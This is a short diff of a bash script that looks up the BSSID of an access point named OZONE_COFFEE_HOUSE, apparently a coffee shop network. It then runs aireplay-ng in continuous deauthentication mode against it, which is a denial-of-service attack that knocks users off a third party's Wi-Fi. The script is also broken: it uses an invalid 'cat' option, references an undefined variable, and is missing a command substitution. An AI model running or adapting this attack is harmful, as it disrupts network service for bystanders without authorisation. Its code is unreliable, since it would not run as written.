@@ -7,7 +7,7 @@ fi
 # Generally playing with some functions 
 
 #Get Bssid of the access point 
-BSSID_AP=cat channel.txt -r 1:150  | grep OZONE_COFFEE_HOUSE | cut -d " " -f2 
+BSSID_AP=$(cat channel.txt -r 1:150  | grep OZONE_COFFEE_HOUSE | cut -d " " -f2)
 
 #Get channel  from deauthentification packets 
 AFTER=aireplay-ng -0 0 -a $BSSID_AP_CHANNEL   wlan0mon > file.txt  ; cat file.txt -r 1 | cut -d " " -f11
